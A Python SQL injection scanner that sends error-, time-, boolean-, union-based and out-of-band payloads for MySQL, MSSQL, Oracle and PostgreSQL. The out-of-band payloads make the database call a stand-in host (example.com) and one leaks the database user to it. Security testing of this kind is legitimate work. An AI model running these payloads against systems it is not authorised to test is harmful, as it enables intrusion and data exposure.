import requests
import urllib.parse
import time
import re
from bs4 import BeautifulSoup

# Database-specific payload dictionaries
MYSQL_PAYLOADS = {
    "error": ["'", "\"", "1'", "1\"", "1' OR '1'='1", "1\" OR \"1\"=\"1", "' OR 1=1 --", "\" OR 1=1 --", "' OR '1'='1' --"],
    "time": ["1' AND SLEEP(3) --", "1\" AND SLEEP(3) --", "1' AND (SELECT * FROM (SELECT(SLEEP(3)))a) --"],
    "boolean": ["' AND 1=1 --", "' AND 1=2 --", "\" AND 1=1 --", "\" AND 1=2 --"],
    "union": ["' UNION SELECT NULL --", "' UNION SELECT NULL,NULL --", "' UNION SELECT @@version --"]
}

MSSQL_PAYLOADS = {
    "error": ["'", "\"", "1'", "1\"", "' OR 'a'='a", "\" OR \"a\"=\"a"],
    "time": ["1'; WAITFOR DELAY '0:0:3' --", "1\"; WAITFOR DELAY '0:0:3' --"],
    "boolean": ["' AND 1=1 --", "' AND 1=2 --", "\" AND 1=1 --", "\" AND 1=2 --"],
    "union": ["' UNION SELECT NULL --", "' UNION SELECT NULL,NULL --", "' UNION SELECT @@version --"]
}

ORACLE_PAYLOADS = {
    "error": ["'", "\"", "1'", "1\"", "' OR '1'='1", "' || '1'='1"],
    "time": ["1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE(('A'),3) --", "1\" AND 1=DBMS_PIPE.RECEIVE_MESSAGE(('A'),3) --"],
    "boolean": ["' AND 1=1 --", "' AND 1=2 --", "\" AND 1=1 --", "\" AND 1=2 --"],
    "union": ["' UNION SELECT NULL FROM DUAL --", "' UNION SELECT NULL,NULL FROM DUAL --", "' UNION SELECT banner FROM v$version --"]
}

POSTGRESQL_PAYLOADS = {
    "error": ["'", "\"", "1'", "1\"", "' OR '1'='1", "' || '1'='1"],
    "time": ["1' AND (SELECT pg_sleep(3)) --", "1\" AND (SELECT pg_sleep(3)) --"],
    "boolean": ["' AND 1=1 --", "' AND 1=2 --", "\" AND 1=1 --", "\" AND 1=2 --"],
    "union": ["' UNION SELECT NULL --", "' UNION SELECT NULL,NULL --", "' UNION SELECT version() --"]
}

# Combined payloads for initial testing
ALL_PAYLOADS = {
    "error": MYSQL_PAYLOADS["error"] + MSSQL_PAYLOADS["error"] + ORACLE_PAYLOADS["error"] + POSTGRESQL_PAYLOADS["error"],
    "time": MYSQL_PAYLOADS["time"] + MSSQL_PAYLOADS["time"] + ORACLE_PAYLOADS["time"] + POSTGRESQL_PAYLOADS["time"],
    "boolean": MYSQL_PAYLOADS["boolean"] + MSSQL_PAYLOADS["boolean"] + ORACLE_PAYLOADS["boolean"] + POSTGRESQL_PAYLOADS["boolean"],
    "union": MYSQL_PAYLOADS["union"] + MSSQL_PAYLOADS["union"] + ORACLE_PAYLOADS["union"] + POSTGRESQL_PAYLOADS["union"]
}

# Error strings for different databases
ERROR_STRINGS = {
    "mysql": ["SQL syntax", "mysql_fetch_array", "MySQL Error", "mysqli_"],
    "mssql": ["Microsoft OLE DB Provider for SQL Server", "SQLServer JDBC Driver", "Microsoft ODBC SQL Server Driver"],
    "oracle": ["ORA-", "Oracle error", "Oracle Database", "PL/SQL"],
    "postgresql": ["PostgreSQL ERROR", "psql:"],
    "sqlite": ["SQLite3::", "SQLite error"]
}

def check_error_based(url, params):
    """
    Checks for error-based SQL injection vulnerabilities with enhanced payloads.
    """
    error_strings = [error for db_errors in ERROR_STRINGS.values() for error in db_errors]

    for param in params:
        for payload in ALL_PAYLOADS["error"]:
            encoded_payload = urllib.parse.quote(payload)
            test_url = f"{url}?{param}={encoded_payload}"

            try:
                response = requests.get(test_url)
                response.raise_for_status()

                # Check if any error strings are present in the response
                for error in error_strings:
                    if error in response.text:
                        return {
                            "vulnerable": True,
                            "type": "Error-based SQL Injection",
                            "url": test_url,
                            "parameter": param,
                            "payload": payload,
                            "error": error
                        }

            except requests.exceptions.RequestException as e:
                print(f"Error checking {test_url}: {e}")
                continue

    return {"vulnerable": False}

def check_time_based_blind(url, params):
    """
    Enhanced check for time-based blind SQL injection.
    """
    for param in params:
        # First, get baseline response time
        baseline_url = f"{url}?{param}=1"
        try:
            start_time = time.time()
            requests.get(baseline_url, timeout=10)
            baseline_time = time.time() - start_time
        except requests.exceptions.RequestException:
            baseline_time = 1  # Default if baseline can't be established

        # Add a margin to baseline to account for network jitter
        threshold = max(2.5, baseline_time * 2)

        for payload in ALL_PAYLOADS["time"]:
            encoded_payload = urllib.parse.quote(payload)
            test_url = f"{url}?{param}={encoded_payload}"

            try:
                start_time = time.time()
                response = requests.get(test_url, timeout=10)
                elapsed_time = time.time() - start_time

                # If response takes significantly longer, it might be vulnerable
                if elapsed_time > threshold:
                    return {
                        "vulnerable": True,
                        "type": "Time-based Blind SQL Injection",
                        "url": test_url,
                        "parameter": param,
                        "payload": payload,
                        "time": elapsed_time,
                        "baseline_time": baseline_time
                    }

            except requests.exceptions.Timeout:
                # Timeout might be indicative of a successful injection
                return {
                    "vulnerable": True,
                    "type": "Time-based Blind SQL Injection (Timeout)",
                    "url": test_url,
                    "parameter": param,
                    "payload": payload
                }
            except requests.exceptions.RequestException as e:
                print(f"Error checking {test_url}: {e}")
                continue

    return {"vulnerable": False}

def check_boolean_based_blind(url, params):
    """
    Checks for boolean-based blind SQL injection vulnerabilities.
    This compares responses from true and false conditions to detect differences.
    """
    for param in params:
        # Check pairs of boolean conditions (true/false)
        for i in range(0, len(ALL_PAYLOADS["boolean"]), 2):
            if i+1 >= len(ALL_PAYLOADS["boolean"]):
                break

            true_payload = ALL_PAYLOADS["boolean"][i]
            false_payload = ALL_PAYLOADS["boolean"][i+1]

            encoded_true = urllib.parse.quote(true_payload)
            encoded_false = urllib.parse.quote(false_payload)

            true_url = f"{url}?{param}={encoded_true}"
            false_url = f"{url}?{param}={encoded_false}"

            try:
                true_response = requests.get(true_url)
                false_response = requests.get(false_url)

                # Compare response lengths or content differences
                if (abs(len(true_response.text) - len(false_response.text)) > 10 and
                    true_response.status_code == false_response.status_code):
                    return {
                        "vulnerable": True,
                        "type": "Boolean-based Blind SQL Injection",
                        "url": true_url,
                        "parameter": param,
                        "true_payload": true_payload,
                        "false_payload": false_payload,
                        "true_length": len(true_response.text),
                        "false_length": len(false_response.text)
                    }

            except requests.exceptions.RequestException as e:
                print(f"Error checking boolean injection: {e}")
                continue

    return {"vulnerable": False}

def check_union_based(url, params):
    """
    Checks for UNION-based SQL injection vulnerabilities.
    Attempts to determine the number of columns and extract data.
    """
    # Patterns to identify successful UNION injections
    version_patterns = [
        r'MySQL [\d\.]+',
        r'PostgreSQL [\d\.]+',
        r'Microsoft SQL Server [\d\.]+',
        r'Oracle Database [\d\.]+',
        r'SQLite version [\d\.]+',
        r'[\d\.]+\-MariaDB',
        r'[\d\.]+\-MySQL'
    ]

    for param in params:
        for payload in ALL_PAYLOADS["union"]:
            encoded_payload = urllib.parse.quote(payload)
            test_url = f"{url}?{param}={encoded_payload}"

            try:
                response = requests.get(test_url)

                # Check for database version strings in response
                for pattern in version_patterns:
                    matches = re.search(pattern, response.text, re.IGNORECASE)
                    if matches:
                        return {
                            "vulnerable": True,
                            "type": "Union-based SQL Injection",
                            "url": test_url,
                            "parameter": param,
                            "payload": payload,
                            "found": matches.group(0)
                        }

            except requests.exceptions.RequestException as e:
                print(f"Error checking {test_url}: {e}")
                continue

    return {"vulnerable": False}

def check_out_of_band(url, params):
    """
    Basic check for out-of-band (OOB) SQL injection vulnerabilities.
    Note: Full detection requires DNS/HTTP callback server which is out of scope here.
    """
    # This is more of a placeholder as true OOB detection requires external services
    oob_payloads = [
        "'; EXEC master..xp_dirtree '//example.com/a' --",  # MSSQL
        "'; SELECT LOAD_FILE(CONCAT('\\\\\\\\', (SELECT @@version), '.example.com\\\\a')) --",  # MySQL
        "'; SELECT UTL_HTTP.REQUEST('http://example.com/'||(SELECT user FROM DUAL)) FROM DUAL --"  # Oracle
    ]

    # In a real implementation, you'd set up a DNS/HTTP callback server
    # Here we just check if the payload doesn't cause errors (might be accepted)
    for param in params:
        for payload in oob_payloads:
            encoded_payload = urllib.parse.quote(payload)
            test_url = f"{url}?{param}={encoded_payload}"

            try:
                response = requests.get(test_url)
                # We can only detect if the payload was accepted without errors
                if response.status_code == 200:
                    return {
                        "potentially_vulnerable": True,
                        "type": "Potential Out-of-Band SQL Injection",
                        "url": test_url,
                        "parameter": param,
                        "payload": payload,
                        "note": "Verification requires an external callback server"
                    }
            except requests.exceptions.RequestException as e:
                print(f"Error checking {test_url}: {e}")
                continue

    return {"vulnerable": False}

def get_parameters_from_url(url):
    """
    Extract parameters from a URL.
    """
    try:
        parsed_url = urllib.parse.urlparse(url)
        query_params = urllib.parse.parse_qs(parsed_url.query)
        return list(query_params.keys())
    except:
        return []

def scan_sql_injection(url):
    """
    Main function to scan for SQL injection vulnerabilities.
    """
    # Get all parameters
    params = get_parameters_from_url(url)

    # If no parameters in URL, try to find forms and their inputs
    if not params:
        try:
            response = requests.get(url)
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = soup.find_all('form')

            for form in forms:
                inputs = form.find_all('input')
                for input_field in inputs:
                    if input_field.get('name'):
                        params.append(input_field.get('name'))
        except Exception as e:
            print(f"Error finding form parameters: {e}")

    if not params:
        return {"vulnerable": False, "reason": "No parameters found to test"}

    # Run all checks in sequence
    checks = [
        ("Error-based", check_error_based),
        ("Union-based", check_union_based),
        ("Boolean-based", check_boolean_based_blind),
        ("Time-based", check_time_based_blind),
        ("Out-of-band", check_out_of_band)
    ]

    results = []
    for check_name, check_func in checks:
        print(f"Running {check_name} SQL injection check...")
        result = check_func(url, params)
        if result.get("vulnerable") or result.get("potentially_vulnerable"):
            results.append(result)

    if results:
        return {
            "vulnerable": True,
            "vulnerabilities_found": len(results),
            "details": results
        }

    return {"vulnerable": False}

if __name__ == '__main__':
    test_url = "http://localhost:3000/#/contact"  # Example vulnerable site
    result = scan_sql_injection(test_url)
    print(result)
